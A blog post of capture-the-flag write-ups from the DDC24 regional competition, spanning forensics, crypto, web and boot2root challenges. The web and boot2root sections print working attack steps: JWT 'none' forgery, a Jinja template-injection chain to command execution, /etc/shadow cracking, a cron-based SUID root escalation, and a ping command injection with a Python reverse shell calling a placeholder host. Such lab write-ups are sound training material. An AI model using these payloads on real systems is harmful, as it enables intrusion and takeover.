---
title: 'DDC24 - Regional Writeups'
description: 'Writeups of all challenges I solved during regionals of DDC24'
pubDate: 'Apr 14 2024'
heroImage: '/blog-placeholder-3.jpg'
tags: ['CTF', 'DDC', 'Web', 'Forensics', 'Rev', 'B2R', 'Misc', 'Crypto', 'Unintended']
---

The regional championship of DDC was held on February 13, 2024, and I ended up placing number 1 in my region and number 10 overall.
![Regional Scoreboard](/src/assets/DDC24Regional/ScoreboardRegionals.jpg)

# Challenges

## Forensics

### Drilske Dæknavne - Email
###### 186pts - 29 solves - Medium
In this challenge series, we are given a dump of an Android phone. For this, we can use [ALEAPP](https://github.com/abrignoni/ALEAPP) which is extremely useful for going through Android files. This is also a module in Autopsy, but I just chose to clone it locally and run the GUI. After this, I am left with a huge report with all the interesting information.

For this first challenge, our goal is to find an email.
By simply navigating to ``accounts_de_0`` or ``Gmail - Active`` in the report, we are greeted with the email ``michellinmartin04@gmail.com`` which is what we need. Therefore, making the flag:
``DDC{michellinmartin04@gmail.com}``

### Drilske Dæknavne - Leverance-IDer
###### 353pts - 21 solves - Medium
For this challenge, we need to find a series of IDs from a conversation. We can find these IDs in a conversation on WhatsApp. This can be found in the ``WhatsApp - One To One Messages`` section of the report. This gives us the following message:
> Btw, hvis du skal verificere med tjekkerne, er leveringskoderne på de 5 poser vasketøj: LKJ73 HDH79 VCS13 LÆD72 SJV4W

Which means our flag is: 
``DDC{LKJ73-HDH79-VCS13-LÆD72-SJV4W}``


### Drilske Dæknavne - Address
###### 415pts - 19 solves - Medium
For this challenge, we need to figure out where he is picking up his "packages." This can be found in the ``Recent Activity`` section of the report. According to the report, the screenshot is from Google Maps and shows us the address ``Svaneknoppen 13``, which means we have our flag:
``DDC{Svaneknoppen13}``

### Drilske Dæknavne - Meeting
###### 633pts - 13 solves - Medium
This challenge is about finding the meeting place, which seems to be a what3words code. This can also be found in ``Recent Activity`` from the what3words app. I think there are other hints spread out as to what the three words are, but it is easier to just find it from the screenshot with the entire code ``indebar.tårerne.danseren``.

This means our flag is: ``DDC{indebar_tårerne_danseren}``


### Det kører som smurt - Unintended
###### 520pts - 16 solves - Medium
I was very surprised when I accidentally solved this one by basically doing nothing for a Medium challenge. To solve this the unintended way, simply load the image file into [Autopsy](https://www.autopsy.com/). It will give an error, but that can just be ignored. Once it is loaded into Autopsy, we can see that there is a zip file under ``Encryption Detected``. We will just ignore this, as that is probably related to the intended solution of the challenge. Instead, simply expand the ``Deleted Files`` section and press ``All(23)``. From here, we have a bunch of images and PDFs. Just look through the images, and some of them will be the flag:
![Unintended Flag](/src/assets/DDC24Regional/UnintendedFlag.png)

The bottom part of the flag is missing, but we can easily figure out that it says ``DDC{klassisk_bolle_med_smør_og_ost}``.

### Spin2win
###### 116pts - 37 solves - Easy
The point of this challenge is to "untwist" an image with the flag that has been swirled or twisted. To do this, I used Gimp's ``Whirl and Pinch`` tool.

After a bunch of tweaking and qualified guessing, I eventually got the flag: ``DDC{y0u-5p1n-m3-R1gh1-R0und-34bY}``. 

Due to the twisted nature of the image, it was very hard to distinguish numbers from letters. The challenge was especially tricky because the author decided to use normal dashes instead of the usual underscores in the flag.

### Friendly Image
###### 151pts - 32 solves - Very Easy
We start by loading the supplied file into Autopsy. By going to the files that are currently on the image, we can find ``Instructions1.txt`` which contains:
> Your task is very simple. The flag is contained within the three remaining files in alphabetical order. 
>The flag starts with "DDC{" then the first five characters of the first file. Then the last three characters
>of the second file. Followed by ...

Clearly, something is missing here. If we go to the deleted files, we can find ``Instructions2.txt`` which contains:
> ...the extension of the third file reverted back from hexadecimal. Im sure you can do it!

Other than that, we also have the following files:
``ini.txt``, ``This is not a pipe.bmp`` and ``zebra.77696E6E696E67``.

So, to solve this, we need to find the first five characters of the first file, which is ``ini.txt`` and starts with ``keep_``. For the next part, we need the last three characters of ``This is not a pipe.bmp``, which are ``on_``. And lastly, we need to convert the file extension of the ``zebra`` file back from hexadecimal, which results in ``winning``. 

This gives us the flag:
``DDC{keep_on_winning}``

### En Bankrøvers Bekendelser
###### 906pts - 5 solves - Medium
For this challenge, we are supplied with an image of a lasagna called ``lasagne.jpg``, a memory file ``mem.vmem``, and the file ``mem.vmss``.
At first, I had a suspicious feeling towards the seemingly random lasagna image and decided to run some stego tools on it. It turns out that there was a ``rar`` file hidden inside!
``steghide extract -sf lasagne.jpg``
Gives us the file ``Planer.rar``, which is password locked. So our goal now seems to be to find the password.

From the description, it mentioned something about a reminder list, which could be interesting.
After loading the ``vmem`` file into Autopsy as a disk image, we can see all the files on it. From here, I simply did a keyword search for ``huskeliste`` (Danish for reminder/todo list). This gave a few results with the following content:
> Huskeliste:
>
> Rob bank <br>
> Dont get shot <br>
> MinLivretErLasagne06
>
> :) Hehe :)

And here we seemingly have our password ``MinLivretErLasagne06``!

Extracting ``Planer.rar`` with the password ``MinLivretErLasagne06`` gives us a file called ``PlanSnedig.txt`` which contains the following:
> Det bliver Danske Bank!
> 
> DDC{1_W15H_1_Wa5_a_UN1c0Rn}

And we have the flag ``DDC{1_W15H_1_Wa5_a_UN1c0Rn}``!

## Web 
### Critical Hit
###### 100pts - 59 solves - Very Easy
This challenge is a website where we can choose to roll a die. By looking at the source JS, we can see that our goal is to roll a 20, but that is not possible from the rolling logic by itself.
To solve this, we simply intercept the roll request and change the roll amount to 20, and we get the flag:

``DDC{U_slaAy_gUrl}``

### None of your business
###### 235pts - 26 solves - Easy
There is not a lot to go on from this challenge. By looking at our cookies, we can notice that we have a JWT token like: 

``eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidmlzaXRvciJ9.NYurrr01ZVp9TFD5Pvi5fNsj3Vrdw_yO9mWggE0dXMw``

If we decode each of these base64 parts, we get:

``{"typ": "JWT","alg": "HS256"}`` and ``{"role": "visitor"}``.

Judging from the name of the challenge, "None of your business," we can guess that the vulnerability here is that the website accepts JWT tokens with the algorithm type set to None, which allows us to modify the role without actually having to sign it.
To do this, we simply have to do the following:
``echo '{"typ":"JWT","alg":"none"}' | base64`` which gives us: ``eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K`` and then:
``echo '{"role":"admin"}' | base64`` which gives us ``eyJyb2xlIjoiYWRtaW4ifQo=``.

After stripping the ``=`` and combining them we get ``eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.eyJyb2xlIjoiYWRtaW4ifQo.``.
Be sure to add the trailing ``.``.

After replacing our JWT cookie with this value, we are greeted with the flag!

``DDC{uPdatEE_NeeDeD_urgenttliy}``


### Comment-all-you-want
###### 847pts - 7 solves - Easy
For this web challenge, we have a blog-based application that now supports comments. Judging from the name of the challenge, the comments must be related to the solution.

And sure enough, if we enter a test payload for Server Side Template Injection like ``{{7+7}}`` we can see that it gets executed and returns ``14`` in the comment.

Now we can use the object class from the MRO to get a list of subclasses that we can use to get RCE:

``{{''.__class__.__mro__[1].__subclasses__()}}``

This returns a long list of all the subclasses we can use. We are interested in ``subprocess.Popen``. Once we have found that, we just need to figure out what index it is located at in the subclasses list. In my case, it is at index ``534``.

Now we can test our RCE by running any command like ``ls``:

``{{''.__class__.__mro__[1].__subclasses__()[534]('ls',shell=True,stdout=-1).communicate()}}``

And sure enough, this returns a list of files in the current directory!

By running ``whoami``, we can actually see that the web app is running as ``root`` too. But all we need to get the flag is to check ``env``:

``{{''.__class__.__mro__[1].__subclasses__()[534]('env',shell=True,stdout=-1).communicate()}}``

And we get our flag: ``DDC{c0mments_4r3_4_n4sty_th1ng}``


## Crypto

### Matematikeksperten
###### 162pts - 31 solves - Very Easy
I'm not sure which cipher this was exactly, but I used the Redefence Cipher on [dcode.fr](https://www.dcode.fr/redefence-cipher) and guessed the flag from there.

I used the following results from Dcode to guess the flag:

``DDC{isuj_o_want_ot__e_gotta_d}mathb`` <br> ``DDC{isu_jow_ant_o_t__egottad_}amthb`` <br> ``bDDC{isuj_o_want_ot__e_gotta_d}math`` 

With these, we have a good idea of some of the words, like "want", "just", and "math".
After some trial and error in Notepad, I eventually got to the flag:
``DDC{i_just_want_to_be_good_at_math}``

### Substitution in the constitution
###### 100pts - 63 solves - Easy
This challenge was a simple substitution cipher using a snippet of the Danish Constitution (Grundloven).

For this, I used the tool on [dcode.fr](https://www.dcode.fr/monoalphabetic-substitution) with the language set to Norwegian to get it as close as possible.
After seeing the output, I found out that the first text was just from the constitution itself, found [here](https://www.retsinformation.dk/eli/lta/1953/169). So I just adjusted the few characters that were wrong until it was readable and gave the flag:

``DDC{vi_mennesker_i_kongeriget_danmark}``

### Time for RSA
###### 709pts - 11 solves - Easy
From the description of this challenge, we are told that the RSA keys were generated on ``18. februar 2024 kl. 21.00 GMT`` and took a few tries, but in less than an hour.

From this information and looking in the source, we can see that it uses the timestamp as the seed for the keygen:
```py
s = int(datetime.now().timestamp())
print(s)
random.seed(s)
```

And since we have the exact time when the RSA keys started being generated, we are able to narrow down the possible range of timestamps to just 3600 until the next hour.

To bruteforce this, I wrote a solve script:
```py
import random
import Crypto.Util.number

from datetime import datetime
from Crypto.Util.number import getPrime, GCD, inverse

def keygen(bits, randfunc):

    # key generation
    while True:
        # sample two different primes
        p = getPrime(bits // 2, randfunc)
        q = getPrime(bits // 2, randfunc)
        if p == q:
            continue
        N = p * q
        phi = (p - 1) * (q - 1)
        e = 65537
        # e needs to be invertible modulo phi(N)
        if GCD(e, phi) > 1:
            continue
        d = inverse(e,phi)
        break
    return (d, e, N)

def encrypt(message, e, N):
    m = message % N
    return pow(m, e, N)

def decrypt(ciphertext, d, N):
    c = ciphertext % N
    return pow(c, d, N)

with open('challenge.txt', 'r') as file:
    message = int(file.read())

start = 1708290000
stop = 1708293600
current = start

for i in range(start, stop):
    print("\n")
    random.seed(current)
    (d, e, N) = keygen(1024, random.randbytes)
    decryption = decrypt(message, d, N)
    cont = decryption.to_bytes((decryption.bit_length() + 7) // 8, 'little')
    print(cont)
    current += 1
    if b"DDC" in cont:
        print("FOUND")
        break
```

This just runs through all the possible seeds from the start time and an hour ahead.

After running for some time, it stops and gives us the flag:
``DDC{timestamps_are_super_bad_seeds_period}``

## Rev

### ASCII Maze
###### 100pts - 41 solves - Easy
This is a simple maze game where we can give the server commands like ``up``, ``down``, ``left``, and ``right``. The first three levels are doable, but the fourth level is a closed box that you cannot escape. By decompiling the binary, it is revealed that there is a secret input command called ``godmode`` that then checks for a password.

By diving into the godmode password check function, we can see that it does a string comparison with the string ``i_believe_i_can_fly``.
So to beat the last level, we simply enable godmode by typing ``godmode`` and the password ``i_believe_i_can_fly``.

After enabling godmode and beating the last level, we are greeted with the flag: ``DDC{Flyv_Ikaros_Flyv}``

## Boot2Root

### Shadow
###### 162pts - 31 solves - Very Easy
For this challenge, we were given an SSH login with the goal of becoming root and reading the flag. The name hints that we probably need to use ``/etc/shadow``.
Luckily, permissions allow us to read it and get the hash of the root user's password: ``$6$4oK4B.qs$6VBmR2suy2nQOqMzxgFEijUirV./ImCQMjyhM.Z3wtshV8t4q8gU3xjO2kSwTrfSUtXjKG4oq2JrLKgnUIV7e.``.

Now we can simply crack the hash using Hashcat:
``hashcat -m 1800 hash rockyou.txt``

After a few seconds or minutes, we have our result ``conga``.

So now we can simply run ``su`` and supply the password ``conga``. Now we can read the flag!

``DDC{Prot3ct_y0ur_s3cr3ts}``


### Cron my tab
###### 415pts - 19 solves - Easy
This challenge gives us the SSH credentials to login to a server where a bash script is running every minute using cron.

We are not able to read the file, but we do have write permissions for it. This script is being run by root, so we can simply do:
``echo "chmod +s /bin/bash" > /etc/read.sh``. And wait a minute for the script to run.

Once the script has run and ``/bin/bash`` has the SUID bit set, then we can just run ``/bin/bash -p``, and we are root!

Now we can read the flag from the root directory:
``DDC{v3ry-funny-cr0n-j0b}``

### Challenge 21
###### 957pts - 3 solves - Easy
I did not solve this challenge during the competition but figured out the solution after it ended.

We are greeted with a classic web interface with the ping command. For anyone experienced in CTFs, this should already scream Command Injection, and sure enough, it was.

We could simply do ``; ls``, and it would run our command.

From here, we can just use Python to create a simple reverse shell:

``; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<IPHERE>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'``

After this, I was stuck for hours during the competition on how to privesc to root in order to read the flag.
After the competition, it turns out you simply just had to run ``su`` and the password was ``root``...

Once we are root we can read the flag: ``DDC{B2uZ71MHnxTVOoaMDWZWZDsm2Qr}``

I also struggled a ton with getting a proper reverse shell during the competition. After it ended, I tested it using the browser lab and instantly got a shell. So, the lesson to learn here is to not trust WSL for reverse shells :)

## Misc

### Penpals and messages
###### 100pts - 75 solves - Very Easy
In this challenge, we are given an image and something about Caesar ciphers in the description.

By running Steghide, we can extract the text we need using:
``steghide extract -sf penpals.jpg``

Which gives us the following text:
``Aipp_hsri_mr_mh_mx``

By Caesar Shifting this text by 4, we get the text we need for the flag:
``Well_done_in_id_it``

Which seems a bit odd, but gives us the correct flag:
``DDC{Well_done_in_id_it}``

After talking with the organizers after the event, it turns out there were some issues with the challenge and CTFd flag not matching up. The intended flag was ``DDC{Well_done_you_did_it}``, but the actual flag in the challenge was added as a correct flag on CTFd a little after the competition started.

### Find the culprit
###### 162pts - 162 solves - Easy
For this challenge, we are given a few folders with a bunch of employees and tasked with finding the right one. All we have to go on is ``EYG_Ziokznygxk``.

The description mentioned that the pattern looked like the layout of a keyboard. This seemed like a hint towards decoding the string we have.
And sure enough, it turns out to be ``keyboard cipher`` which can be decoded using [this tool](https://www.cachesleuth.com/keyboardcipher.html).
After decoding, we get ``cfo_thirtyfour``. So now we know that the employee we are looking for is working for the finance department and has employee number 34.

And by simply opening the file on employee 34 in the finance department, we get his name and employee ID, which is all the information we need!

``DDC{Finance_Karl_Emil_1928}``